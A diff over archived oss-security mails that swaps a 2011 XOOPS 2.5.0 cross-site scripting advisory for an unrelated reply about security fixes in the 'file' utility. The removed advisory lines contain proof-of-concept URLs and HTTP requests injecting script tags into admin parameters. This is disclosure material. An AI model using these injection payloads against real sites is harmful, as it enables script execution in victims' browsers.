@@ -1,153 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/13
-Message-ID: <AANLkTi=0vH8dCVfx9T3OzBD29hiW+=Y2XJMD=_o_44+5@mail.gmail.com>
-Date: Fri, 18 Mar 2011 21:02:29 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/07/6
+Message-Id: <20110407191737.B31D25653E@rebar.astron.com>
+Date: Thu, 7 Apr 2011 15:17:37 -0400
+From: christos@...las.com (Christos Zoulas)
+To: Vincent Danen <vdanen@...hat.com>, oss-security@...ts.openwall.com,  file@...gw.com
+Subject: Re: Possible security fixes in 5.05?
 Content-Type: text/plain; charset=utf-8
 
-XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
+On Apr 7, 11:37am, vdanen@...hat.com (Vincent Danen) wrote:
+-- Subject: Re: [oss-security] Possible security fixes in 5.05?
+
+| Looks like there are a few issues here:
+| 
+| 2011-01-16  19:31  Reuben Thomas <rrt at sc3d.org>
+|      * Fix two potential buffer overruns in apprentice_list.
+| 
+| https://github.com/glensc/file/commit/148f1089b5c4f5ec5d51c2f147379817cb9ac47d
+
+This is an order of evaluation issue, that could read memory over the allocated
+limit. The limit check is done after the read instead of before. The code
+has not been present in any release.
+
+| 2010-09-20  15:24  Reuben Thomas <rrt at sc3d.org>
+|      * Minor security fix to softmagic.c (don't use untrusted
+|        string as printf format).
+| 
+| https://github.com/glensc/file/commit/b05926f28f3cab0ef77101f89be154329dcb8dea
+
+The code is present in [5.00-5.04]. It should not be an issue because the desc
+printf formats are checked during parsing. It is mostly to silence a compiler
+warning for printf(ms->desc) -> printf("%s", ms->desc). The code does
+printf(ms->desc, argument) in a ton of other places.
 
 
-
-1. OVERVIEW
-
-The XOOPS 2.5.0 and lower versions were vulnerable to Cross Site Scripting.
-
-
-2. BACKGROUND
-
-XOOPS is an acronym of eXtensible Object Oriented Portal System. It's
-the #1 Content Management System (CMS) project on www.sourceforge.net
-and a recipient of several awards, and constantly places as finalist
-in various CMS and Open Source competitions. It incorporates many
-modules such as forums, photo galleries, calendars, article management
-etc.
-
-
-3. VULNERABILITY DESCRIPTION
-
-Several parameters such as module/module[], memberslist_id[],
-newname[], oldname[] were not properly sanitized upon submission to
-the /modules/system/admin.php url, which allows attacker to conduct
-Cross Site Scripting attack. This may allow an attacker to create a
-specially crafted URL that would execute arbitrary script code in a
-victim's browser.
-
-
-4. VERSIONS AFFECTED
-
-XOOPS 2.5.0 and lower
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-
-Parameter: module
-
-http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin&op=install&module=pm%3Cimg%20src=a%20onerror=alert%28String.fromCharCode%2888,83,83%29%29%3Eaawe
-
-
-Parameter: module[]
-
-[REQUEST]
-POST /xoops/modules/system/admin.php HTTP/1.1
-Host: attacker.in
-Connection: close
-Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
-Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
-xoops_user=1-549115432fcb56150b18bef08004f77d;
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 100
-
-op=confirm&module%5b%5d=1"><script>alert(1)</script>&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System
-[/REQUEST]
-
-
-Parameter: memberslist_id[]
-
-[REQUEST]
-POST /xoops/modules/system/admin.php HTTP/1.1
-Host: attacker.in
-Connection: close
-Referer: http://attacker.in/xoops/modules/system/admin.php?fct=users&selgroups=2
-Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
-xoops_user=1-549115432fcb56150b18bef08004f77d;
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 94
-
-memberslist_id%5b%5d="><script>alert(1)</script>&op=action_group&Submit=&selgroups=1&fct=mailusers&edit_group=add_group
-[/REQUEST]
-
-
-Parameter: newname[]
-
-[REQUEST]
-POST /xoops/modules/system/admin.php HTTP/1.1
-Host: attacker.in
-Connection: close
-Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
-Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
-xoops_user=1-549115432fcb56150b18bef08004f77d;
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 100
-
-op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System"><script>alert(1)</script>
-[/REQUEST]
-
-
-Parameter: oldname[]
-
-[REQUEST]
-POST /xoops/modules/system/admin.php HTTP/1.1
-Host: attacker.in
-Connection: close
-Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
-Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
-xoops_user=1-549115432fcb56150b18bef08004f77d;
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 100
-
-op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System"><script>alert(1)</script>1bf8581e3dc&fct=modulesadmin&newname%5b1%5d=System
-[/REQUEST]
-
-
-6. SOLUTION
-
-Upgrade to XOOPS 2.5.1 or higher
-
-
-7. VENDOR
-
-XOOPS Development Team
-http://xoops.org
-
-
-8. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2011-03-10: notified vendor
-2011-03-16: vendor released fixed version
-2011-03-18: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/[xoops_2.5.0]_cross_site_scripting
-Vendor Announcement: http://xoops.org/modules/news/article.php?storyid=5851
-What XSS Can Do: http://yehg.net/lab/pr0js/view.php/What%20XSS%20Can%20Do.pdf
-XSS FAQs: http://www.cgisecurity.com/articles/xss-faq.shtml
-XSS (wiki): http://en.wikipedia.org/wiki/Cross-site_scripting
-XSS (owasp): http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
-OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
-CWE-79: http://cwe.mitre.org/data/definitions/79.html
-
-
-#yehg [2011-03-18]
+christos
